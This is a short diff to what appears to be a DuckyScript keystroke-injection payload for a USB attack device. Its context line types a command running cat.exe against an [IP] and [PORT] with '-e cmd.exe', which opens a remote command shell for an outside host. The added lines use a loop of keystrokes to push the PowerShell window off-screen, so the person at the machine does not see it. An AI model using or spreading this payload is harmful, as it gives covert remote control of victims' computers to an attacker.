@@ -35,4 +35,14 @@ STRING .\ncat.exe [IP] [PORT] -e cmd.exe
 DELAY 50
 ENTER
 DELAY 100
-WINDOWS DOWN
+ALT SPACE
+DELAY 100
+STRING M
+REM Moves the PS window down and out of view.
+VAR $ARROW = 100
+WHILE ( $ARROW > 0 )
+    DOWNARROW
+    DELAY 5
+    $ARROW = ( $ARROW - 1 )
+END_WHILE
+ENTER
